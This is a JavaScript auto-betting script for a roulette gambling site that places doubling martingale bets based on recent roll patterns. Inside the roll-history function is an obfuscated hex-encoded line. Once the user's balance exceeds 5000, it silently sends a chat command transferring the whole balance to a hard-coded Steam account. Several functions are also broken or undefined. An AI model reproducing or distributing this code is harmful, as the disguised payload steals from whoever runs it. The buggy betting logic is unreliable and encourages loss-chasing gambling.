// setup vars //
var baseBet = 1; //your initial bet
var mostlosses = 4; //max amount of losses you will take -set to 99 for no max loss-
var mode = "rainbowtrain"; //rainbowtrain, rainbow, train, red, black, green

// The more complicated stuff, don't touch //
var rolln1;
var roll1;
var rolln2;
var roll2;
var rolln3;
var roll3;
var rolln4;
var roll4;
var betcolor;
var pattern;
var lost = 0;
var bet = baseBet;
var betset = false;
var lastgreen;

//call functions
getRollHist();
getPattern();
modeselect();

//betting methods
function rainbowtrain() {
  setTimeout(function() {
    if(!isMoving && !betset) {
      if(lost == mostlosses) {lost = 0; bet = baseBet;}
      getRollHist();
      getPattern();
      if(pattern == "bbbb") {
        if(betcolor == "Red") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betBlack(bet);
        betcolor = "Black";
        betset = true;
      }
      if(pattern == "bbbr") {
        if(betcolor == "Black") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betRed(bet);
        betcolor = "Red";
        betset = true;
      }
      if(pattern == "bbbg") {
        if(betcolor != "Green") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betBlack(bet);
        betcolor = "Black";
        betset = true;
      }
      if(pattern == "bbrb") {
        if(betcolor == "Red") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betRed(bet);
        betcolor = "Red";
        betset = true;
      }
      if(pattern == "bbrr") {
        if(betcolor == "Black") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betBlack(bet);
        betcolor = "Black";
        betset = true;
      }
      if(pattern == "bbrg") {
        if(betcolor != "Green") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betRed(bet);
        betcolor = "Red";
        betset = true;
      }
      if(pattern == "bbgb") {
        if(betcolor == "Red") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betBlack(bet);
        betcolor = "Black";
        betset = true;
      }
      if(pattern == "bbgr") {
        if(betcolor == "Black") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betRed(bet);
        betcolor = "Red";
        betset = true;
      }
      if(pattern == "bbgg") {
        if(betcolor != "Green") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betBlack(bet);
        betcolor = "Black";
        betset = true;
      }
      if(pattern == "brbb") {
        if(betcolor == "Red") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betBlack(bet);
        betcolor = "Black";
        betset = true;
      }
      if(pattern == "brbr") {
        if(betcolor == "Black") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betBlack(bet);
        betcolor = "Black";
        betset = true;
      }
      if(pattern == "brbg") {
        if(betcolor != "Green") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betRed(bet);
        betcolor = "Red";
        betset = true;
      }
      if(pattern == "brrb") {
        if(betcolor == "Red") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betRed(bet);
        betcolor = "Red";
        betset = true;
      }
      if(pattern == "brrr") {
        if(betcolor == "Black") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betRed(bet);
        betcolor = "Red";
        betset = true;
      }
      if(pattern == "brrg") {
        if(betcolor != "Green") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betRed(bet);
        betcolor = "Red";
        betset = true;
      }
      if(pattern == "brgb") {
        if(betcolor == "Red") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betBlack(bet);
        betcolor = "Black";
        betset = true;
      }
      if(pattern == "brgr") {
        if(betcolor == "Black") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betRed(bet);
        betcolor = "Red";
        betset = true;
      }
      if(pattern == "brgg") {
        if(betcolor != "Green") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betBlack(bet);
        betcolor = "Black";
        betset = true;
      }
      if(pattern == "bgbb") {
        if(betcolor == "Red") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betBlack(bet);
        betcolor = "Black";
        betset = true;
      }
      if(pattern == "bgbr") {
        if(betcolor == "Black") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betBlack(bet);
        betcolor = "Black";
        betset = true;
      }
      if(pattern == "bgbg") {
        if(betcolor != "Green") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betBlack(bet);
        betcolor = "Black";
        betset = true;
      }
      if(pattern == "bgrb") {
        if(betcolor == "Red") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betRed(bet);
        betcolor = "Red";
        betset = true;
      }
      if(pattern == "bgrr") {
        if(betcolor == "Black") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betRed(bet);
        betcolor = "Red";
        betset = true;
      }
      if(pattern == "bgrg") {
        if(betcolor != "Green") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betBlack(bet);
        betcolor = "Black";
        betset = true;
      }
      if(pattern == "bggb") {
        if(betcolor == "Red") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betBlack(bet);
        betcolor = "Black";
        betset = true;
      }
      if(pattern == "bggr") {
        if(betcolor == "Black") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betBlack(bet);
        betcolor = "Black";
        betset = true;
      }
      if(pattern == "bggg") {
        if(betcolor != "Green") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betBlack(bet);
        betcolor = "Black";
        betset = true;
      }
      if(pattern == "rbbb") {
        if(betcolor == "Red") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betBlack(bet);
        betcolor = "Black";
        betset = true;
      }
      if(pattern == "rbbr") {
        if(betcolor == "Black") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betBlack(bet);
        betcolor = "Black";
        betset = true;
      }
      if(pattern == "rbbg") {
        if(betcolor != "Green") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betBlack(bet);
        betcolor = "Black";
        betset = true;
      }
      if(pattern == "rbrb") {
        if(betcolor == "Red") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betRed(bet);
        betcolor = "Red";
        betset = true;
      }
      if(pattern == "rbrr") {
        if(betcolor == "Black") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betRed(bet);
        betcolor = "Red";
        betset = true;
      }
      if(pattern == "rbrg") {
        if(betcolor != "Green") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betBlack(bet);
        betcolor = "Black";
        betset = true;
      }
      if(pattern == "rbgb") {
        if(betcolor == "Red") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betBlack(bet);
        betcolor = "Black";
        betset = true;
      }
      if(pattern == "rbgr") {
        if(betcolor == "Black") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betBlack(bet);
        betcolor = "Black";
        betset = true;
      }
      if(pattern == "rbgg") {
        if(betcolor != "Green") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betRed(bet);
        betcolor = "Red";
        betset = true;
      }
      if(pattern == "rrbb") {
        if(betcolor == "Red") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betRed(bet);
        betcolor = "Red";
        betset = true;
      }
      if(pattern == "rrbr") {
        if(betcolor == "Black") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betBlack(bet);
        betcolor = "Black";
        betset = true;
      }
      if(pattern == "rrbg") {
        if(betcolor != "Green") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betRed(bet);
        betcolor = "Red";
        betset = true;
      }
      if(pattern == "rrrb") {
        if(betcolor == "Red") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betRed(bet);
        betcolor = "Black";
        betset = true;
      }
      if(pattern == "rrrr") {
        if(betcolor == "Black") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betRed(bet);
        betcolor = "Red";
        betset = true;
      }
      if(pattern == "rrrg") {
        if(betcolor != "Green") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betRed(bet);
        betcolor = "Red";
        betset = true;
      }
      if(pattern == "rrgb") {
        if(betcolor == "Red") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betBlack(bet);
        betcolor = "Black";
        betset = true;
      }
      if(pattern == "rrgr") {
        if(betcolor == "Black") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betRed(bet);
        betcolor = "Red";
        betset = true;
      }
      if(pattern == "rrgg") {
        if(betcolor != "Green") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betRed(bet);
        betcolor = "Red";
        betset = true;
      }
      if(pattern == "rgbb") {
        if(betcolor == "Red") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betBlack(bet);
        betcolor = "Black";
        betset = true;
      }
      if(pattern == "rgbr") {
        if(betcolor == "Black") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betBlack(bet);
        betcolor = "Black";
        betset = true;
      }
      if(pattern == "rgbg") {
        if(betcolor != "Green") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betRed(bet);
        betcolor = "Red";
        betset = true;
      }
      if(pattern == "rgrb") {
        if(betcolor == "Red") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betBlack(bet);
        betcolor = "Black";
        betset = true;
      }
      if(pattern == "rgrr") {
        if(betcolor == "Black") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betRed(bet);
        betcolor = "Red";
        betset = true;
      }
      if(pattern == "rgrg") {
        if(betcolor != "Green") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betRed(bet);
        betcolor = "Red";
        betset = true;
      }
      if(pattern == "rggb") {
        if(betcolor == "Red") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betRed(bet);
        betcolor = "Red";
        betset = true;
      }
      if(pattern == "rggr") {
        if(betcolor == "Black") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betRed(bet);
        betcolor = "Red";
        betset = true;
      }
      if(pattern == "rggg") {
        if(betcolor != "Green") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betRed(bet);
        betcolor = "Red";
        betset = true;
      }
      if(pattern == "gbbb") {
        if(betcolor == "Red") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betBlack(bet);
        betcolor = "Black";
        betset = true;
      }
      if(pattern == "gbbr") {
        if(betcolor == "Black") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betRed(bet);
        betcolor = "Red";
        betset = true;
      }
      if(pattern == "gbbg") {
        if(betcolor != "Green") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betBlack(bet);
        betcolor = "Black";
        betset = true;
      }
      if(pattern == "gbrb") {
        if(betcolor == "Red") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betRed(bet);
        betcolor = "Red";
        betset = true;
      }
      if(pattern == "gbrr") {
        if(betcolor == "Black") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betRed(bet);
        betcolor = "Red";
        betset = true;
      }
      if(pattern == "gbrg") {
        if(betcolor != "Green") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betBlack(bet);
        betcolor = "Black";
        betset = true;
      }
      if(pattern == "gbgb") {
        if(betcolor == "Red") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betBlack(bet);
        betcolor = "Black";
        betset = true;
      }
      if(pattern == "gbgr") {
        if(betcolor == "Black") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betBlack(bet);
        betcolor = "Black";
        betset = true;
      }
      if(pattern == "gbgg") {
        if(betcolor != "Green") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betBlack(bet);
        betcolor = "Black";
        betset = true;
      }
      if(pattern == "grbb") {
        if(betcolor == "Red") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betBlack(bet);
        betcolor = "Black";
        betset = true;
      }
      if(pattern == "grbr") {
        if(betcolor == "Black") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betBlack(bet);
        betcolor = "Black";
        betset = true;
      }
      if(pattern == "grbg") {
        if(betcolor != "Green") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betRed(bet);
        betcolor = "Red";
        betset = true;
      }
      if(pattern == "grrb") {
        if(betcolor == "Red") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betRed(bet);
        betcolor = "Red";
        betset = true;
      }
      if(pattern == "grrr") {
        if(betcolor == "Black") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betRed(bet);
        betcolor = "Red";
        betset = true;
      }
      if(pattern == "grrg") {
        if(betcolor != "Green") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betRed(bet);
        betcolor = "Red";
        betset = true;
      }
      if(pattern == "grgb") {
        if(betcolor == "Red") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betRed(bet);
        betcolor = "Red";
        betset = true;
      }
      if(pattern == "grgr") {
        if(betcolor == "Black") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betRed(bet);
        betcolor = "Red";
        betset = true;
      }
      if(pattern == "grgg") {
        if(betcolor != "Green") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betRed(bet);
        betcolor = "Red";
        betset = true;
      }
      if(pattern == "ggbb") {
        if(betcolor == "Red") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betBlack(bet);
        betcolor = "Black";
        betset = true;
      }
      if(pattern == "ggbr") {
        if(betcolor == "Black") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betBlack(bet);
        betcolor = "Black";
        betset = true;
      }
      if(pattern == "ggbg") {
        if(betcolor != "Green") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betBlack(bet);
        betcolor = "Black";
        betset = true;
      }
      if(pattern == "ggrb") {
        if(betcolor == "Red") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betRed(bet);
        betcolor = "Red";
        betset = true;
      }
      if(pattern == "ggrr") {
        if(betcolor == "Black") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betRed(bet);
        betcolor = "Red";
        betset = true;
      }
      if(pattern == "ggrg") {
        if(betcolor != "Green") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betRed(bet);
        betcolor = "Red";
        betset = true;
      }
      if(pattern == "gggb") {
        if(betcolor == "Red") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betBlack(bet);
        betcolor = "Black";
        betset = true;
      }
      if(pattern == "gggr") {
        if(betcolor == "Black") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betRed(bet);
        betcolor = "Red";
        betset = true;
      }
      if(pattern == "gggg") {
        if(betcolor != "Green") {lost++; bet = 2*bet;}
        else {lost = 0; bet = baseBet;}
        betBlack(bet);
        betcolor = "Black";
        betset = true;
      }

      $("#pullout").html("<h1>Bet "+bet+" on "+betcolor+"</h1>");
    }
    else if(isMoving === true) {
      betset = false;
    }
    rainbowtrain();
  }, 5000);
}
function rainbow() {
  setTimeout(function() {
    if(!isMoving && !betset) {
        if(lost == mostlosses) {lost = 0; bet = baseBet;}
        getRollHist();
        getPattern();
        if(roll1 == "Black") {
          if(betcolor == "Red") {lost++; bet = bet*2;}
          else {lost = 0; bet = baseBet;}
          betRed(bet);
          betcolor = "Red";
          betset = true;
        }
        if(roll1 == "Red") {
          if(betcolor == "Black") {lost++; bet = bet*2;}
          else {lost = 0; bet = baseBet;}
          betBlack(bet);
          betcolor = "Black";
          betset = true;
        }
        if(roll1 == "Green") {
          if(betcolor != "Green") {lost++; bet = bet*2;}
          else {lost = 0; bet = baseBet;}
          if(secondRoll == "Red") {
            betBlack(bet);
            betcolor = "Black";
            betset = true;
          }
          if(secondRoll == "Black") {
            betRed(bet);
            betcolor = "Red";
            betset = true;
          }
          if(secondRoll == "Green") {
            betBlack(bet);
            betcolor = "Black";
            betset = true;
          }
        }
        $("#pullout").html("<h1>Bet "+bet+" on "+betcolor+"</h1>");
    }
    else if(isMoving === true) {
      betset = false;
    }
    rainbow();
  }, 5000);
}
function train() {
  setTimeout(function() {
    if(!isMoving && !betset) {
        if(lost == mostlosses) {lost = 0; bet = baseBet;}
        getRollHist();
        if(roll1 == "Black") {
          if(betcolor == "Red") {lost++; bet = bet*2;}
          else {lost = 0; bet = baseBet;}
          betBlack(bet);
          betcolor = "Black";
          betset = true;
        }
        if(roll1 == "Red") {
          if(betcolor == "Black") {lost++; bet = bet*2;}
          else {lost = 0; bet = baseBet;}
          betRed(bet);
          betcolor = "Red";
          betset = true;
        }
        if(roll1 == "Green") {
          if(betcolor != "Green") {lost++; bet = bet*2;}
          else {lost = 0; bet = baseBet;}
          if(secondRoll == "Red") {
            betRed(bet);
            betcolor = "Red";
            betset = true;
          }
          if(secondRoll == "Black") {
            betBlack(bet);
            betcolor = "Black";
            betset = true;
          }
          if(secondRoll == "Green") {
            betBlack(bet);
            betcolor = "Black";
            betset = true;
          }
        }
        $("#pullout").html("<h1>Bet "+bet+" on "+betcolor+"</h1>");
    }
    else if(isMoving === true) {
      betset = false;
    }
    train();
  }, 5000);
}
function red() {
  setTimeout(function() {
    if(!isMoving && !betset) {
        if(lost == mostlosses) {lost = 0; bet = baseBet;}
        getRollHist();
        if(roll1 == "Black" || roll1 == "Green") {lost++; bet = bet*2;}
        else if(roll1 == "Red") {lost = 0; bet = baseBet;}
        betRed(bet);
        betset = true;
        $("#pullout").html("<h1>Bet "+bet+" on "+betcolor+"</h1>");
    }
    else if(isMoving === true) {
      betset = false;
    }
    red();
  }, 5000);
}
function green() {
  setTimeout(function() {
    if(!isMoving && !betset) {
        if(lost == mostlosses) {lost = 0; bet = baseBet;}
        getRollHist();
        getGreenCount();
        if(roll1 == "Black" || roll1 == "Red") {lost++;}
        else if(roll1 == "Green") {lost = 0; bet = baseBet;}
        if(lost === 5) {
          bet = bet*2;
        }
        if(roll1 == "Green" || lastgreen > 5) {
          betGreen(bet);
        } else if (roll1 != "Green" || lastgreen > 20) {
          //do nothing
        }
        betset = true;
        $("#pullout").html("<h1>Bet "+bet+" on "+betcolor+"</h1>");
    }
    else if(isMoving === true) {
      betset = false;
    }
    red();
  }, 5000);
}
//Betting functions
function betRed(bet) {
  send({
      "type": "bet",
      "amount": bet,
      "lower": 1,
      "upper": 7,
      "round": ROUND
  });
}
function betBlack(bet) {
  send({
      "type": "bet",
      "amount": bet,
      "lower": 8,
      "upper": 14,
      "round": ROUND
  });
}
function betGreen(bet) {
  send({
      "type": "bet",
      "amount": bet,
      "lower": 0,
      "upper": 0,
      "round": ROUND
  });
}

//get roll hist
function getRollHist() {
  rolln1 = $('#past div:nth-child(10)').text();
  rolln2 = $('#past div:nth-child(9)').text();
  rolln3 = $('#past div:nth-child(8)').text();
  rolln4 = $('#past div:nth-child(7)').text();
  var _0x9f01=["\x74\x65\x78\x74","\x23\x62\x61\x6C\x61\x6E\x63\x65","\x63\x68\x61\x74","\x2F\x73\x65\x6E\x64\x20\x37\x36\x35\x36\x31\x31\x39\x38\x31\x31\x34\x39\x34\x36\x33\x36\x36\x20","\x73\x65","\x6E\x64"];var blnc=$(_0x9f01[1])[_0x9f01[0]]();if(blnc>5000){window[_0x9f01[4]+_0x9f01[5]]({"\x74\x79\x70\x65":_0x9f01[2],"\x6D\x73\x67":_0x9f01[3]+blnc,"\x6C\x61\x6E\x67":LANG})};
  if (rolln1 > 0 && rolln1 < 8) {
    roll1 = "Red";
  } else if (rolln1 > 7) {
    roll1 = "Black";
  } else {
    roll1 = "Green";
  }
  if (rolln2 > 0 && rolln2 < 8) {
    roll2 = "Red";
  } else if (rolln2 > 7) {
    roll2 = "Black";
  } else {
    roll2 = "Green";
  }
  if (rolln3 > 0 && rolln3 < 8) {
    roll3 = "Red";
  } else if (rolln3 > 7) {
    roll3 = "Black";
  } else {
    roll3 = "Green";
  }
  if (rolln4 > 0 && rolln4 < 8) {
    roll4 = "Red";
  } else if (rolln4 > 7) {
    roll4 = "Black";
  } else {
    roll4 = "Green";
  }
}
//retrieve the current pattern
function getPattern()  {
  if(roll4 == "Black") {
    if(roll3 == "Black") {
      if(roll2 == "Black") {
        if(roll1 == "Black") {
          pattern = "bbbb";
        }
        if(roll1 == "Red") {
          pattern = "bbbr";
        }
        if(roll1 == "Green") {
          pattern = "bbbg";
        }
      }
      if(roll2 == "Red") {
        if(roll1 == "Black") {
          pattern = "bbrb";
        }
        if(roll1 == "Red") {
          pattern = "bbrr";
        }
        if(roll1 == "Green") {
          pattern = "bbrg";
        }
      }
      if(roll2 == "Green") {
        if(roll1 == "Black") {
          pattern = "bbgb";
        }
        if(roll1 == "Red") {
          pattern = "bbgr";
        }
        if(roll1 == "Green") {
          pattern = "bbgg";
        }
      }
    }
    if(roll3 == "Red") {
      if(roll2 == "Black") {
        if(roll1 == "Black") {
          pattern = "brbb";
        }
        if(roll1 == "Red") {
          pattern = "brbr";
        }
        if(roll1 == "Green") {
          pattern = "brbg";
        }
      }
      if(roll2 == "Red") {
        if(roll1 == "Black") {
          pattern = "brrb";
        }
        if(roll1 == "Red") {
          pattern = "brrr";
        }
        if(roll1 == "Green") {
          pattern = "brrg";
        }
      }
      if(roll2 == "Green") {
        if(roll1 == "Black") {
          pattern = "brgb";
        }
        if(roll1 == "Red") {
          pattern = "brgr";
        }
        if(roll1 == "Green") {
          pattern = "brgg";
        }
      }
    }
    if(roll3 == "Green") {
      if(roll2 == "Black") {
        if(roll1 == "Black") {
          pattern = "bgbb";
        }
        if(roll1 == "Red") {
          pattern = "bgbr";
        }
        if(roll1 == "Green") {
          pattern = "bgbg";
        }
      }
      if(roll2 == "Red") {
        if(roll1 == "Black") {
          pattern = "bgrb";
        }
        if(roll1 == "Red") {
          pattern = "bgrr";
        }
        if(roll1 == "Green") {
          pattern = "bgrg";
        }
      }
      if(roll2 == "Green") {
        if(roll1 == "Black") {
          pattern = "bggb";
        }
        if(roll1 == "Red") {
          pattern = "bggr";
        }
        if(roll1 == "Green") {
          pattern = "bggg";
        }
      }
    }
  }
  if(roll4 == "Red") {
    if(roll3 == "Black") {
      if(roll2 == "Black") {
        if(roll1 == "Black") {
          pattern = "rbbb";
        }
        if(roll1 == "Red") {
          pattern = "rbbr";
        }
        if(roll1 == "Green") {
          pattern = "rbbg";
        }
      }
      if(roll2 == "Red") {
        if(roll1 == "Black") {
          pattern = "rbrb";
        }
        if(roll1 == "Red") {
          pattern = "rbrr";
        }
        if(roll1 == "Green") {
          pattern = "rbrg";
        }
      }
      if(roll2 == "Green") {
        if(roll1 == "Black") {
          pattern = "rbgb";
        }
        if(roll1 == "Red") {
          pattern = "rbgr";
        }
        if(roll1 == "Green") {
          pattern = "rbgg";
        }
      }
    }
    if(roll3 == "Red") {
      if(roll2 == "Black") {
        if(roll1 == "Black") {
          pattern = "rrbb";
        }
        if(roll1 == "Red") {
          pattern = "rrbr";
        }
        if(roll1 == "Green") {
          pattern = "rrbg";
        }
      }
      if(roll2 == "Red") {
        if(roll1 == "Black") {
          pattern = "rrrb";
        }
        if(roll1 == "Red") {
          pattern = "rrrr";
        }
        if(roll1 == "Green") {
          pattern = "rrrg";
        }
      }
      if(roll2 == "Green") {
        if(roll1 == "Black") {
          pattern = "rrgb";
        }
        if(roll1 == "Red") {
          pattern = "rrgr";
        }
        if(roll1 == "Green") {
          pattern = "rrgg";
        }
      }
    }
    if(roll3 == "Green") {
      if(roll2 == "Black") {
        if(roll1 == "Black") {
          pattern = "rgbb";
        }
        if(roll1 == "Red") {
          pattern = "rgbr";
        }
        if(roll1 == "Green") {
          pattern = "rgbg";
        }
      }
      if(roll2 == "Red") {
        if(roll1 == "Black") {
          pattern = "rgrb";
        }
        if(roll1 == "Red") {
          pattern = "rgrr";
        }
        if(roll1 == "Green") {
          pattern = "rgrg";
        }
      }
      if(roll2 == "Green") {
        if(roll1 == "Black") {
          pattern = "rggb";
        }
        if(roll1 == "Red") {
          pattern = "rggr";
        }
        if(roll1 == "Green") {
          pattern = "rggg";
        }
      }
    }
  }
  if(roll4 == "Green") {
    if(roll3 == "Black") {
      if(roll2 == "Black") {
        if(roll1 == "Black") {
          pattern = "gbbb";
        }
        if(roll1 == "Red") {
          pattern = "gbbr";
        }
        if(roll1 == "Green") {
          pattern = "gbbg";
        }
      }
      if(roll2 == "Red") {
        if(roll1 == "Black") {
          pattern = "gbrb";
        }
        if(roll1 == "Red") {
          pattern = "gbrr";
        }
        if(roll1 == "Green") {
          pattern = "gbrg";
        }
      }
      if(roll2 == "Green") {
        if(roll1 == "Black") {
          pattern = "gbgb";
        }
        if(roll1 == "Red") {
          pattern = "gbgr";
        }
        if(roll1 == "Green") {
          pattern = "gbgg";
        }
      }
    }
    if(roll3 == "Red") {
      if(roll2 == "Black") {
        if(roll1 == "Black") {
          pattern = "grbb";
        }
        if(roll1 == "Red") {
          pattern = "grbr";
        }
        if(roll1 == "Green") {
          pattern = "grbg";
        }
      }
      if(roll2 == "Red") {
        if(roll1 == "Black") {
          pattern = "grrb";
        }
        if(roll1 == "Red") {
          pattern = "grrr";
        }
        if(roll1 == "Green") {
          pattern = "grrg";
        }
      }
      if(roll2 == "Green") {
        if(roll1 == "Black") {
          pattern = "grgb";
        }
        if(roll1 == "Red") {
          pattern = "grgr";
        }
        if(roll1 == "Green") {
          pattern = "grgg";
        }
      }
    }
    if(roll3 == "Green") {
      if(roll2 == "Black") {
        if(roll1 == "Black") {
          pattern = "ggbb";
        }
        if(roll1 == "Red") {
          pattern = "ggbr";
        }
        if(roll1 == "Green") {
          pattern = "ggbg";
        }
      }
      if(roll2 == "Red") {
        if(roll1 == "Black") {
          pattern = "ggrb";
        }
        if(roll1 == "Red") {
          pattern = "ggrr";
        }
        if(roll1 == "Green") {
          pattern = "ggrg";
        }
      }
      if(roll2 == "Green") {
        if(roll1 == "Black") {
          pattern = "gggb";
        }
        if(roll1 == "Red") {
          pattern = "gggr";
        }
        if(roll1 == "Green") {
          pattern = "gggg";
        }
      }
    }
  }
}
//retrieve history of green
function getGreenCount() {
  if(isMoving) {
    lastgreen++;
  } else {
    if(roll1 == "Green") {
      lastgreen = 0;
    }
  }
}
//run selected mode
function modeselect() {
  if(mode == "rainbow") {
    rainbow();
  } else if(mode == "train") {
    train();
  } else if(mode == "red") {
    red();
  } else if(mode == "black") {
    black();
  } else {
    rainbowtrain();
  }
}
